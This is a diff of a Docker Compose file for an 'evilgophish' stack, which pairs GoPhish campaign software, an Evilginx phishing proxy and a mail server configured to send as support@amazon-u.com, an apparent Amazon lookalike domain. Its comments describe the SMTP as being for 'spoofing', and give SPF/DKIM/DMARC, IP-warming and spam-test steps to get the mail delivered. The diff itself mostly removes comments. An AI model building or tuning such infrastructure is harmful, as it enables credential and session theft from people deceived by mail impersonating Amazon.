@@ -1,18 +1,15 @@
 # docker-compose.yml
-# Enhanced Docker Compose for evilgophish with integrated mailserver for SMTP.
-# New Service: mailserver (docker-mailserver) for long-term email sending/relay.
-# Why: Custom SMTP for spoofing/deliverability; integrates with GoPhish for campaigns.
-# How: GoPhish uses mailserver:587 with auth; Evilginx indirect (via GoPhish emails).
-# Volumes: Added maildata (mails/DB), mailstate (queue/state), maillogs, config (custom cfgs).
-# Ports: SMTP 25/465/587 exposed; IMAP/POP optional (commented).
+# Enhanced setup for evilgophish with SMTP (docker-mailserver) for sending from support@amazon-u.com.
+# Fixes: Ensures mailconfig volume is initialized; validates Dockerfile.evilfeed build.
+# Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time), mailserver (SMTP).
+# Volumes: mailconfig for DKIM/postfix; persistent for data/logs/uploads.
+# Ports: 80/443 (web), 25/465/587 (SMTP), 3333/1337 (local admin/feed).
 # Best Practices:
-# - DNS: Point MX to host IP; add SPF TXT "v=spf1 ip4:YOUR_IP include:_spf.yourdomain ~all".
-# - DKIM: Post-setup, run docker exec mailserver setup dkim; add TXT to DNS.
-# - Security: Use strong pass; firewall ports (ufw allow 25,465,587 from trusted).
-# - Deliverability: Warm IP; monitor logs for bounces/spam.
-# - Integration: Set GoPhish SMTP to mailserver:587, user support@amazon-u.com.
-# - Long-term: Persistent volumes; backup maildata; rotate DKIM yearly.
-# Tips: Test sending with docker exec mailserver swaks --to test@gmail.com --from support@amazon-u.com --server localhost:587 -au support@amazon-u.com -ap PASS.
+# - DNS: MX/A for mail.amazon-u.com in Lightsail; SPF/DKIM/DMARC for deliverability.
+# - Security: Use secrets for SMTP/Twilio/Turnstile; restrict ports (ufw).
+# - Deliverability: Warm IP; test with mail-tester.com.
+# - Backup: Export maildata/gophish_data; snapshot Lightsail instance.
+# - Troubleshooting: Check maillogs; ensure mailconfig has DKIM keys.
 
 version: '3.8'
 
@@ -51,7 +48,7 @@ services:
       - logs:/app/logs
     environment:
       - GOPHISH_DB_PATH=/app/data/gophish.db
-      - SMTP_HOST=${SMTP_HOST:-mailserver}  # Now defaults to internal mailserver
+      - SMTP_HOST=${SMTP_HOST:-mailserver}
       - SMTP_PORT=${SMTP_PORT:-587}
       - SMTP_USER=${SMTP_USER:-support@amazon-u.com}
       - SMTP_PASS=${SMTP_PASS}
@@ -61,7 +58,7 @@ services:
     command: ./gophish --admin ./config.json
     depends_on:
       - evilfeed
-      - mailserver  # Depend on mail for SMTP
+      - mailserver
     restart: unless-stopped
     networks:
       - evilnet
@@ -139,23 +136,21 @@ services:
       - "25:25"
       - "465:465"
       - "587:587"
-      # - "143:143"  # IMAP if needed
-      # - "993:993"  # IMAPS
     volumes:
       - maildata:/var/mail
       - mailstate:/var/mail-state
       - maillogs:/var/log/mail
       - ./mailconfig:/tmp/docker-mailserver/
-      - logs:/var/log/supervisor  # Shared logs
+      - logs:/var/log/supervisor
     environment:
       - OVERRIDE_HOSTNAME=mail.${DOMAIN:-amazon-u.com}
-      - DMS_DMARC_POLICY=quarantine  # Or reject/none
+      - DMS_DMARC_POLICY=quarantine
       - DMS_SPF_POLICY=reject
-      - PERMIT_DOCKER=network  # Allow from evilnet
-      - ENABLE_CLAMAV=1  # Antivirus
-      - ENABLE_FAIL2BAN=1  # Security
-      - ENABLE_POSTGREY=0  # Optional greylisting
-      - SSL_TYPE=snakeoil  # Self-signed; use letsencrypt for prod
+      - PERMIT_DOCKER=network
+      - ENABLE_CLAMAV=1
+      - ENABLE_FAIL2BAN=1
+      - ENABLE_POSTGREY=0
+      - SSL_TYPE=snakeoil
     cap_add:
       - NET_ADMIN
       - SYS_PTRACE
@@ -178,7 +173,7 @@ volumes:
   maildata:
   mailstate:
   maillogs:
-  mailconfig:  # For overrides like postfix.cf
+  mailconfig:
 
 networks:
   evilnet:
